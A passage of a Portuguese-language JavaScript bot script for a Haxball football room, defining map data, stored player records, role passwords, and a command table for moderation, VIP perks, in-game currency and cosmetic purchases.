8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":122,"v1":123,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":125,"v1":124,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":124,"v1":125,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":127,"v1":126,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":126,"v1":127,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":129,"v1":128,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":128,"v1":129,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5}],"goals":[{"p0":[-557.5,-80],"p1":[-557.5,80],"team":"red"},{"p0":[557.5,80],"p1":[557.5,-80],"team":"blue"}],"discs":[{"radius":5,"pos":[-550,80],"color":"FF6666","trait":"goalPost","y":80},{"radius":5,"pos":[-550,-80],"color":"FF6666","trait":"goalPost","y":-80,"x":-560},{"radius":5,"pos":[550,80],"color":"6666FF","trait":"goalPost","y":80},{"radius":5,"pos":[550,-80],"color":"6666FF","trait":"goalPost","y":-80},{"radius":3,"invMass":0,"pos":[-550,240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[-550,-240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[550,-240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[550,240],"color":"FFCC00","bCoef":0.1,"trait":"line"}],"planes":[{"normal":[0,1],"dist":-240,"bCoef":1,"trait":"ballArea","vis":false,"curve":0},{"normal":[0,-1],"dist":-240,"bCoef":1,"trait":"ballArea"},{"normal":[0,1],"dist":-270,"bCoef":0.1},{"normal":[0,-1],"dist":-270,"bCoef":0.1},{"normal":[1,0],"dist":-620,"bCoef":0.1},{"normal":[-1,0],"dist":-620,"bCoef":0.1},{"normal":[1,0],"dist":-620,"bCoef":0.1,"trait":"ballArea","vis":false,"curve":0},{"normal":[-1,0],"dist":-620,"bCoef":0.1,"trait":"ballArea","vis":false,"curve":0}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":0.5},"goalNet":{"vis":true,"bCoef":0.1,"cMask":["ball"]},"line":{"vis":true,"bCoef":0.1,"cMask":[""]},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]}},"playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":5},"ballPhysics":{"radius":6.25,"bCoef":0.4,"invMass":1.5,"damping":0.99,"color":"FFCC00"}}`
};

var afkdb = JSON.parse(localStorage.getItem("afks")) || []
var afks = afkdb[0] || {};
var vipsdb = JSON.parse(localStorage.getItem("vips")) || []
var vips = vipsdb[0] || {}; //  Jogadores Vips
var banidosstorage = JSON.parse(localStorage.getItem("banidos")) || [];
var banidos = banidosstorage[0] || {}
var dadosjogadoresstorage = JSON.parse(localStorage.getItem("dadosjogadores")) || []; //  Busca dados dos jogadores
var dadosjogadores = dadosjogadoresstorage[0] || {}
var astrosstorage = JSON.parse(localStorage.getItem("astros")) || [];
var astros = astrosstorage[0] || {};
var minhasprovos = JSON.parse(localStorage.getItem("minhasprovos")) || [];
var minhastagsstorage = JSON.parse(localStorage.getItem("minhastags")) || []; // busca tags
var minhastags = minhastagsstorage[0] || {}
var minhascoresstorage = JSON.parse(localStorage.getItem("minhascores")) || []; // busca cores
var minhascores = minhascoresstorage[0] || {}
var cordochatstorage = JSON.parse(localStorage.getItem("cordochat")) || []; // busca cores
var cordochat = cordochatstorage[0] || {}
var infovipstorage = JSON.parse(localStorage.getItem("infovip")) || []; //  Informações sobre vip
var infovip = infovipstorage[0] || {}; //  Informações sobre vip
var tagsstorage = JSON.parse(localStorage.getItem("tags")) || []; // busca tags
var tags = tagsstorage[0] || {}; // busca tags
var codigos = JSON.parse(localStorage.getItem("codigos")) || []; //  Jogadores Vips
var autologinstorage = JSON.parse(localStorage.getItem("autologin")) || [];
var autologin = autologinstorage[0] || {}
var connautologin = '';
var authautologin = '';

if (modeRoom === "normal") futsalNovo = maps.normal;
if (modeRoom === "flash") futsalNovo = maps.flash;

var contas = JSON.parse(localStorage.getItem("contas")) || []
var account = contas[0] || {}, confirm = [];
var subAccounts = []
var account2 = subAccounts[0] || {};

room.setScoreLimit(scoreLimit);
room.setTimeLimit(timeLimit);
room.setTeamsLock(true);
room.setKickRateLimit(6, 0, 0); 

var masterPassword = getRandomInt2(10000, 599999);
var donoPassword = getRandomInt2(10000, 599999);
var diretorPassword = "vendido";
var gerentePassword = "vendido";
var adminPassword = getRandomInt2(10000, 99999);
var modsPassword = getRandomInt2(10000, 599999);

var vip1Password = getRandomInt2(10000, 99999);
var vip2Password = getRandomInt2(100000, 299999);
var vip3Password = getRandomInt2(200000, 399999);
var vip4Password = getRandomInt2(300000, 499999);

var roomPassword = '';
var tipoVip = 0;
var streak = 0;
var streakMax = 0;
var streakRecord = 0;
var lastTeamStreak = [];

/* OPTIONS */

var drawTimeLimit = 8;
var teamSize = 3;
var maxAdmins = 0;
var disableBans = false;
var debugMode = false;
var afkLimit = debugMode ? Infinity : 12;

var defaultSlowMode = 1
var chooseModeSlowMode = 1
var slowMode = defaultSlowMode
var SMSet = new Set()

var hideClaimMessage = true;
var mentionPlayersUnpause = true;

class Goal {
    constructor(time, team, striker, assist) {
        this.time = time;
        this.team = team;
        this.striker = striker;
        this.assist = assist;
    }
}

class Game {
    constructor() {
        this.date = Date.now();
        this.scores = room.getScores();
        this.playerComp = getStartingLineups();
        this.goals = [];
        this.rec = room.startRecording();
        this.touchArray = [];
    }
}



class PlayerComposition {
    constructor(player, auth, timeEntry, timeExit) {
        this.player = player;
        this.auth = auth;
        this.timeEntry = timeEntry;
        this.timeExit = timeExit;
        this.inactivityTicks = 0;
        this.GKTicks = 0;
    }
}

class MutePlayer {
    constructor(name, id, auth) {
        this.id = MutePlayer.incrementId();
        this.name = name;
        this.playerId = id;
        this.auth = auth;
        this.unmuteTimeout = null;
    }

    static incrementId() {
        if (!this.latestId) this.latestId = 1
        else this.latestId++
        return this.latestId
    }

    setDuration(minutes) {
        this.unmuteTimeout = setTimeout(() => {
            room.sendAnnouncement(
                `Você foi desmutado!`,
                this.playerId,
                announcementColor,
                "bold",
                HaxNotification.CHAT
            );
            this.remove();
        }, minutes * 60 * 1000);
        muteArray.add(this);
    }

    remove() {
        this.unmuteTimeout = null;
        muteArray.removeById(this.id);
    }
}

class MuteList {
    constructor() {
        this.list = [];
    }

    add(mutePlayer) {
        this.list.push(mutePlayer);
        return mutePlayer;
    }

    getById(id) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.id === id);
        if (index !== -1) {
            return this.list[index];
        }
        return null;
    }

    getByPlayerId(id) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.playerId === id);
        if (index !== -1) {
            return this.list[index];
        }
        return null;
    }

    getByAuth(auth) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.auth === auth);
        if (index !== -1) {
            return this.list[index];
        }
        return null;
    }

    removeById(id) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.id === id);
        if (index !== -1) {
            this.list.splice(index, 1);
        }
    }

    removeByAuth(auth) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.auth === auth);
        if (index !== -1) {
            this.list.splice(index, 1);
        }
    }
}

class BallTouch {
    constructor(player, time, goal, position) {
        this.player = player;
        this.time = time;
        this.goal = goal;
        this.position = position;
    }
}

class HaxStatistics {
    constructor(playerName = '') {
        this.playerName = playerName
        this.games = 0
        this.wins = 0
        this.empates = 0
        this.winrate = '0.00%'
        this.goals = 0
        this.assists = 0
        this.CS = 0
        this.ownGoals = 0
        this.pontos = 0
    }
}

/* PLAYERS */

const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
const State = { PLAY: 0, PAUSE: 1, STOP: 2 };
const Role = { PLAYER: 0, ADMIN_TEMP: 1, ADMIN_PERM: 2, MASTER: 3 };
const HaxNotification = { NONE: 0, CHAT: 1, MENTION: 2 };
const Situation = { STOP: 0, KICKOFF: 1, PLAY: 2, GOAL: 3 };

var gameState = State.STOP;
var playSituation = Situation.STOP;
var goldenGoal = false;

var playersAll = [];
var players = [];
var teamRed = [];
var teamBlue = [];
var teamSpec = [];

var teamRedStats = [];
var teamBlueStats = [];

var banList = [];
var jogadoresRoom = [];

/* STATS */

var possession = [0, 0];
var actionZoneHalf = [0, 0];
var lastWinner = Team.SPECTATORS;

/* AUTH */

var authArray = {};
var masterList = [];
var donoList = [];
var diretores = [];
var gerentes = [];
var adminList = [];
var mods = [];
var dono = [];
var gerente = [];

var goalAttribution = 0;
var modoVoteBan = false;
var votosBan = 0;
var votouBan = [];
var modoVoteMute = false;
var votosMute = 0;
var votouMute = [];
var currentStadium;

/* COMMANDS */

var commands = {
    ajuda: {
        aliases: ['commands'],
        roles: Role.PLAYER,
        desc: `
	Este comando mostra todos os comandos disponíveis. Ele também pode mostrar a descrição de um comando em particular.
Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
        function: helpCommand,
    },
    discord: {
        aliases: ['ds', 'dc'],
        roles: Role.PLAYER,
        desc: `
        Este comando envia o link de convite para o nosso discord.`,
        function: sendLinkDiscord,
    },
    pv: {
        aliases: ['pm'],
        roles: Role.PLAYER,
        desc: `
        Este comando envia mensagem privada para outro jogador. Para usar digite !pv #id mensagem (utilize # para pegar o id)`,
        function: playerChat,
    },
    calladmin: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
	Este comando chamará um administrador no discord, com uma mensagem opcional. Exemplo: !calladminh Adm vem banir um racista pfvr`,
        function: callAdmin,
    },
    registrar: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Cria a sua conta`,
        function: registrar,
    },
    login: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Loga na sua conta.`,
        function: login,
    },
    mudarsenha: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Muda a senha da sua conta.`,
        function: mudarSenha,
    },
    voteban: {
        aliases: [],
        roles: Role.PLAYER,
        desc: ``,
        function: voteBan,
    },
    votemute: {
        aliases: [],
        roles: Role.PLAYER,
        desc: ``,
        function: voteMute,
    },
    fundador: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: fundadorCommand,
    },
    dono: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: donoCommand,
    },
    mod: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: modCommand,
    },
    admin: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: adminCommand,
    },
    vip: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: vipCommand,
    },
    rr2: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `Coloca a bola no centro do mapa`,
        function: rr2Command
    },
    afk: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando faz você ficar AFK.
    Tem restrições: 1 minuto mínimo de tempo de AFK, 5 minutos no máximo e 10 minutos de cooldown.`,
        function: afkCommand,
    },
    afks: {
        aliases: ['afklist'],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra todos os jogadores que estão AFK.`,
        function: afkListCommand,
    },
    bb: {
        aliases: ['bye'],
        roles: Role.PLAYER,
        desc: `
	Este comando faz você sair instantaneamente (uso recomendado).`,
        function: leaveCommand,
    },
    uni: {
        aliases: ['uniformes', 'unis', 'camisas', 'camisetas'],
        roles: Role.PLAYER,
        desc: `
	Este comando exibe categorias de uniformes disponiveis.`,
        function: mostraUnisCategorias,
    },
    selecoes: {
        aliases: ['sele', 'sel'],
        roles: Role.PLAYER,
        desc: `
	Este comando exibe uniformes de selecões disponiveis.`,
        function: mostraUnisSelecoes,
    },
    brasileiros: {
        aliases: [],
        roles: Role.PLAYER, // Bot desenvolvido pelo no recoil
        desc: `
	Este comando exibe uniformes brasileiros disponiveis.`,
        function: mostraUnisBrasileiros,
    },
    outros: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
	Este comando exibe outros uniformes brasileiros disponiveis.`,
        function: mostraUnisOutros,
    },
    creditos: {
        aliases: ['credits', 'no recoil', 'script'],
        roles: Role.PLAYER,
        desc: `Este comando mostra as informações sobre o desenvolvedor do script`,
        function: credits,
    },
    receber: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: receber,
    },
    estrangeiros: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
	Este comando exibe uniformes estrangeiros disponiveis.`,
        function: mostraUnisEstrangeiros,
    },
    especiais: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
	Este comando exibe uniformes especiais disponiveis.`,
        function: mostraUnisEspeciais,
    },
    provos: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
	Este comando exibe uniformes de selecões disponiveis.`,
        function: mostraProvocacoes,
    },
    me: {
        aliases: ['mestat', 'mestats'],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra suas estatísticas globais na sala para tu somente.`,
        function: globalStatsCommandMe,
    },
    mostrarstats: {
        aliases: ['stat', 'stats', 'mostrarstat'],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra suas estatísticas globais na sala para todos.`,
        function: globalStatsCommand,
    },
    loja: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra os produtos a venda.`,
        function: lojaCommand,
    },
    resetar: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando reseta todas as tuas estatísticas.`,
        function: resetarStats,
    },
    streak: {
        aliases: ['streaks'],
        roles: Role.PLAYER,
        desc: false,
        function: mostraStreak,
    },
    rank: {
        aliases: ['rankinfo'],
        roles: Role.PLAYER,
        desc: `
	Este comando mostra todos os ranks disponiveis no servidor. Ele também explica os requesitos para upar de rank.`,
        function: rankInfo,
    },
    pontos: {
        aliases: ['ponto'],
        roles: Role.PLAYER,
        desc: `
	Este comando mostra seus pontos no servidor. Ele também explica os requesitos para adquirir pontos.`,
        function: pontos,
    },
    renomear: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando permite que você se renomeie para a tabela de classificação.`,
        function: renameCommand,
    },
    jogos: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra os 5 melhores jogadores com mais jogos na sala.`,
        function: statsLeaderboardCommand,
    },
    vitorias: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra os 5 melhores jogadores com mais vitórias na sala.`,
        function: statsLeaderboardCommand,
    },
    tag: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando muda a TAG que você possui.`,
        function: mudarTag,
    },
    gols: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra os 5 melhores jogadores com mais gols na sala.`,
        function: statsLeaderboardCommand,
    },
    assist: {
        aliases: ['assistencias', 'assists'],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra os 5 melhores jogadores com mais assistências na sala.`,
        function: statsLeaderboardCommand,
    },
    cs: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra os 5 melhores jogadores com mais CS na sala.`,
        function: statsLeaderboardCommand,
    },
    map1: {
        aliases: [],
        roles: Role.ADMIN_TEMP,
        desc: `
        Este comando carrega o grande estádio.`,
        function: stadiumCommand,
    },
    rr: {
        aliases: [],
        roles: Role.ADMIN_PERM,
        desc: `
    Este comando reinicia o jogo.`,
        function: restartCommand,
    },
    mutar: {
        aliases: ['m'],
        roles: Role.ADMIN_PERM,
        desc: `
        Este comando permite silenciar um jogador. Ele não poderá falar por um determinado período e pode ser ativado a qualquer momento pelos administradores.
    São necessários 2 argumentos:
    Argumento 1: #<id> onde <id> é o id do jogador alvo. Isso não funcionará se o jogador for um administrador.
    Argumento 2 (opcional): <duration> onde <duration> é a duração do mute em minutos. Se nenhum valor for fornecido, o silêncio dura a duração padrão, ${muteDuration} minutos.
    Exemplo: !mute #3 20 irá silenciar o player com id 3 por 20 minutos.`,
        function: muteCommand,
    },
    desmutar: {
        aliases: ['um'],
        roles: Role.ADMIN_PERM, // Bot desenvolvido pelo OBL
        desc: `
        Este comando permite ativar o som de alguém.
    Leva 1 argumento:
    Argumento 1: #<ID> onde <ID> é o ID do player silenciado.
    OU
    Argumento 1: <ID> onde <ID> é o número associado ao mute fornecido pelo comando '!mutados'.
    Exemplo: !desmutar #300 irá ativar o chat do player com id 300,
             !desmutar 8 irá ativar o chat do jogador n°8 de acordo com o comando '!mutados'.`,
        function: unmuteCommand,
    },
    mutados: {
        aliases: [],
        roles: Role.ADMIN_PERM,
        desc: `
        Este comando mostra a lista de jogadores silenciados.`,
        function: muteListCommand,
    },
    clearbans: {
        aliases: [],
        roles: testMode ? Role.PLAYER : Role.MASTER,
        desc: `
	Este comando desbloqueia todos. Ele também pode desbanir um jogador em particular, adicionando seu ID como argumento.`,
        function: clearbansCommand,
    },
    bans: {
        aliases: ['banlist'],
        roles: testMode ? Role.PLAYER : Role.MASTER,
        desc: `
    Este comando mostra todos os jogadores que foram banidos e seus IDs.`,
        function: banListCommand,
    },

    admins: {
        aliases: [],
        roles: testMode ? Role.PLAYER : Role.MASTER, // Bot desenvolvido pelo OBL
        desc: `
    Este comando mostra todos os jogadores que são administradores permanentes.`,
        function: adminListCommand,
    },
    setadmin: {
        aliases: [],
        roles: testMode ? Role.PLAYER : Role.PLAYER,
        desc: `
    Este comando permite definir alguém como administrador. Ele poderá se conectar como administrador, podendo ser removido a qualquer momento pelos mestres.
Leva 1 argumento:
Argumento 1: #<id> onde <id> é o id do jogador alvo.
Exemplo: !setadmin #3 dará admin ao jogador com id 3.`,
        function: setAdminCommand,
    },
    removeradmin: {
        aliases: [],
        roles: testMode ? Role.PLAYER : Role.MASTER,
        desc: `
    Este comando remove um admin!`,
        function: removerAdmin,
    },
    setvip: {
        aliases: [''],
        roles: Role.MASTER,
        desc: `
    Este comando permite definir alguém como VIP.
    Leva 1 argumento:
    Argumento 1: #<id> onde <id> é o id do jogador alvo.
    Exemplo: !setvip #3 dará VIP ao jogador com id 3.`,
        function: setVipCommand,
    },
    vips: {
        aliases: [''],
        roles: Role.MASTER,
        desc: false,
        function: showVips,
    },
    removervip: {
        aliases: [''],
        roles: Role.MASTER,
        desc: false,
        function: removerVip,
    },
    senha: {
        aliases: ['pw', 'password'],
        roles: Role.MASTER,
        desc: `
        Este comando permite adicionar uma senha à sala.
    Leva 1 argumento:
    Argumento 1: <password> onde <password> é a senha que você deseja para a sala.
    
    Para remover a senha da sala, basta digitar '!password'.`,
        function: passwordCommand,
    },
    ban: {
        aliases: ['banir', 'bann'],
        roles: testMode ? Role.PLAYER : Role.ADMIN_PERM,
        desc: false,
        function: ban,
    },
    odd: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
        Este comando mostra todos os jogadores que são administradores permanentes.`,
        function: updateOD,
    },
    settag: {
        aliases: [],
        roles: Role.MASTER,
        desc: false,
        function: setNewTag,
    },
    apostar: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: apostar,
    },
    astros: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando mostra quantas moedas "Astros" você possui.`,
        function: showAstros,
    },
    infoban: {
        aliases: [],
        roles: testMode ? Role.PLAYER : Role.ADMIN_TEMP,
        desc: false,
        function: infoban,
    },
    comprartag: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: comprartag,
    },
    minhastags: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: minhasTags,
    },
    minhascores: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: minhasCores,
    },
    comprarcor: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: comprarCor,
    },
    tirarcor: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: tirarCor,
    },
    codigo: {
        aliases: [],
        roles: Role.MASTER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: codigo,
    },
    setcor: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: mudarCor,
    },
    infovip: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: infoVip,
    },
    autologin: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `
            Este comando Exclui a TAG que você possui.`,
        function: autoLogin,
    },
    getastros: {
        aliases: [],
        roles: Role.PLAYER,
        desc: false,
        function: testeAstros1,
    },
    comprarprovo: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `Adquira uma provocação especial!`,
        function: comprarprovo
    },
    minhasprovos: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `Veja as provocações disponiveis para uso`,
        function: minhasprovosFunction
    },
    provos2: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `Veja as provocações disponiveis para compra`,
        function: provos2
    },
    provo2: {
        aliases: [],
        roles: Role.PLAYER,
        desc: `Envia uma provocação da sua lista`,
        function: provo2Function
    },
};

function provo2Function(player, message) {
    let messageSplit = message.split(" ");
    const provoNumero = parseInt(messageSplit[1]);
    const found = minhasprovos.find(element => element[0] == player.name && element[1][0] == provoNumero); 
    if (found) {
        room.sendAnnouncement(`${player.name} PROVOCOU: ${found[1][1]}`, null, cores.amarelo, "bold", 2);
    } else {
        room.sendAnnouncement(`Você não tem a provocação ${provoNumero}.`, player.id, cores.vermelho, "bold", 1);
    }
}

function provos2(player, message) {
    let listaProvocacoes = "Provocações disponíveis para compra:\n";
    for (const [numero, provocacao] of Object.entries(provosBuy)) {
        listaProvocacoes += `${numero}: ${provocacao}\n`;
    }
    room.sendAnnouncement(listaProvocacoes, player.id, cores.verde, "bold", 1);
}

function minhasprovosFunction(player, message) {
    const found = minhasprovos.find(element => element[0] == player.name)

    console.log(found);

    if (found) {
        const provocacoes = found.slice(1).map(provocacao => `${provocacao[0]}: ${provocacao[1]}`);
        room.sendAnnouncement(`Suas provocações: ${provocacoes.join(", ")}`, player.id, cores.vermelho, "bold", 0);
    } else {
        room.sendAnnouncement(`Você não tem provocações.`, player.id, cores.vermelho, "bold", 0);
    }
}

function infoban(player, message) {
    var nickid = message.split(/ +/).slice(1).join(' ');
    var jogador = procurar(nickid)
    if (jogador) {
        if (banidos[jogador['nome']]) {
            const jogadorbanido = banidos[jogador['nome']]
            const nome = jogadorbanido['nome']
            const tempo = jogadorbanido['tempo']
            const motivo = jogadorbanido['motivo']
            const desban = jogadorbanido['data']
            const restante = diferencaTempo(desban)

            room.sendAnnouncement(`Nick: ${nome} | Tempo de ban: ${tempo} | Motivo: ${motivo} | Restam ${restante} dias para desban.`,
                player.id, announcementColor, 'bold', null)

        }
        else {
            room.sendAnnouncement('Jogador aparentemente não está banido',
                player.id, errorColor, 'bold', null)
        }

    }
    else {
        room.sendAnnouncement('Nick ou ID errado. !desbanir <NICK ou ID>',
            player.id, errorColor, 'bold', null)
    }
}

function autoLogin(player, message) {
    const msg = message.split(/ +/).slice(1);
    console.log(authArray[player.id])
    if (!account[player.name]) {
        room.sendAnnouncement("Registre-se primeiro para fazer o autologin!", player.id, errorColor, "bold", 0);
        return;
    }
    if (msg.length != 0) {
        room.sendAnnouncement("Digite apenas !autologin para logar automaticamente", player.id, errorColor, "bold", 0);
    }
    else {
        if (autologin[player.name]) {
            delete autologin[player.name]
            autologinstorage.splice(0, autologinstorage.length)
            autologinstorage.push(autologin)
            localStorage.setItem('autologin', JSON.stringify(autologinstorage))

            room.sendAnnouncement("Você retirou o autologin!", player.id, errorColor, "bold", 0);
        }
        else {
            autologin[player.name] = {
                'auth': authautologin,
                'conn': connautologin
            }
            autologinstorage.splice(0, autologinstorage.length)
            autologinstorage.push(autologin)
            localStorage.setItem('autologin', JSON.stringify(autologinstorage))
            room.sendAnnouncement("Você ativou o autologin.", player.id, errorColor, "bold", 0);
        }
    }
}

//##################################### SISTEMA ASTROS #########################################################################

var produtos = { vips: { 1: 10000, 2: 15000, 3: 20000, 4: 30000 }, tag: 2000, cor: 2000, provo: 2000 }

function transacoesPlayers(url, params = {}) {

    const xhr = new XMLHttpRequest();

    xhr.open("POST", url);

    xhr.setRequestHeader("Content-Type", "application/json"); // formato json

    /**
     * DISCORD WEBHOOK PARAMS
     * https://birdie0.github.io/discord-webhooks-guide/index.html
     */
    xhr.send(JSON.stringify(params));

}

function lojaCommand(player) {
    var nomesProdutos = Object.keys(produtos).join(', ');
    var resultado = "[PV] Produtos: " + nomesProdutos;

    room.sendAnnouncement(resultado, player.id, cores.rosa, "bold");
    return false;
}

function dataehora() {
    let data = new Date(),
        dia = data.getDate().toString().padStart(2, '0'),
        mes = (data.getMonth() + 1).toString().padStart(2, '0'),
        ano = data.getFullYear(),
        horas = data.getHours().toString().padStart(2, '0'),
        minutos = data.getMinutes().toString().padStart(2, '0'),
        segundos = data.getSeconds().toString().padStart(2, '0');
    return `${dia}/${mes} de ${ano}, ás ${horas}:${minutos} e ${segundos} segundos`;
}

/* function vip(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (parseInt(msgArray[0]) > 0 && parseInt(msgArray[0]) <= 4) {

            const vipComumDuration = 2592000000;
            const vipGalacticoDuration = 2592000000;
            const dataAtual = new Date().getTime();

            if (vips[authArray[player.id]] && !infovip[player.name]) {
                room.sendAnnouncement(
                    `Você já tem vip vitalíio.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
                return;
            }

            if (infovip[player.name]) {
                const duration = infovip[player.name]['tempo'];
                const dataExpiracao = duration; // obtém a data de expiração do VIP em milissegundos
                const diferenca = dataExpiracao - dataAtual; // calcula a diferença em milissegundos
                const diasFaltando = Math.ceil(diferenca / (1000 * 60 * 60 * 24)); // converte a diferença para dias arredondando para cima
                if (parseInt(msgArray[0]) == tipoVip) {
                    var pago = verificarPreco(player, produtos.vips[parseInt(msgArray[0])])
                    if (!pago) {
                        return;
                    }
                    const newDuration = Date.now() + vipGalacticoDuration + (diasFaltando) * 1000 * 60 * 60 * 24;
                    infovip[player.name]['tempo'] = newDuration;
                    infovipstorage.splice(0, infovipstorage.length)
                    infovipstorage.push(infovip)
                    localStorage.setItem("infovip", JSON.stringify(infovipstorage));
                    room.sendAnnouncement(`Você resgatou seu vip ${vipnames[parseInt(msgArray[0])]}, parabéns!!!!`, player.id, 0x08FFF7, "bold", 0);
                    room.sendAnnouncement(`${player.name} ativou mais um período VIP ${vipnames[parseInt(msgArray[0])]}!!!`, null, 0x08FFF7, "bold", 0);
                    transacoesPlayers(urls.transacoes, {
                        content: "```" + roomName + "\n" + "💎Data dessa transação: " + `${dataehora()}` + "\n" +
                            `💎${player.name} comprou mais um Vip ${vipnames[parseInt(msgArray[0])]}` + "```"
                    })

                }
                else {
                    if (tentativasvip.includes(player.name)) {
                        var pago = verificarPreco(player, produtos.vips[parseInt(msgArray[0])])
                        if (!pago) {
                            return;
                        }
                        if (vips[authArray[player.id]]) {
                            vips[authArray[player.id]].tipoVip = parseInt(msgArray[0])
                        } else {
                            vips[authArray[player.id]] =
                            {
                                name: player.name,
                                auth: authArray[player.id],
                                tipoVip: parseInt(msgArray[0]),
                                corChat: "",
                                fonte: 0,
                                pausarJogoOFF: false,
                                furarFila: false,
                                provos: {},
                                unis: {},
                                avatarGol: [],
                                msgEntrada: '',
                            }
                        }
                        vipsdb.splice(0, vipsdb.length);
                        vipsdb.push(vips)
                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                        const newDuration = Date.now() + vipGalacticoDuration;
                        infovip[player.name]['tempo'] = newDuration;
                        infovip[player.name]['tipo'] = msgArray[0];
                        infovipstorage.splice(0, infovipstorage.length)
                        infovipstorage.push(infovip)
                        localStorage.setItem("infovip", JSON.stringify(infovipstorage));
                        if (vips[authArray[player.id]]) {
                            tipoVip = vips[authArray[player.id]].tipoVip;
                        }
                        room.sendAnnouncement(`Você resgatou seu vip ${vipnames[parseInt(msgArray[0])]}, parabéns!!!!`, player.id, 0x08FFF7, "bold", 0);
                        room.sendAnnouncement(`${player.name} ativou mais um período VIP ${vipnames[parseInt(msgArray[0])]}!!!`, null, 0x08FFF7, "bold", 0);
                        transacoesPlayers(urls.transacoes, {
                            content: "```" + roomName + "\n" + "💎Data dessa transação: " + `${dataehora()}` + "\n" +
                                `💎${player.name} comprou um mês de Vip ${vipnames[parseInt(msgArray[0])]}` + "```"
                        })
                    }
                    else {
                        room.sendAnnouncement(
                            `Você está tentando comprar um vip diferente do que você ja tem`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT
                        );
                        room.sendAnnouncement(
                            `Você irá perder seu tempo de VIP anterior e irá ficar apenas com o novo.`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT
                        );
                        room.sendAnnouncement(
                            `Para continuar digite o comando de comprar novamente, você tem 10 segundos`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT
                        );
                        tentativasvip.push(player.name)
                        setTimeout(() => {
                            tentativasvip.splice(tentativasvip.indexOf(player.name), 1)
                        }, 10000);
                    }

                }
            }
            else {
                var pago = verificarPreco(player, produtos.vips[parseInt(msgArray[0])])
                if (!pago) {
                    return;
                }
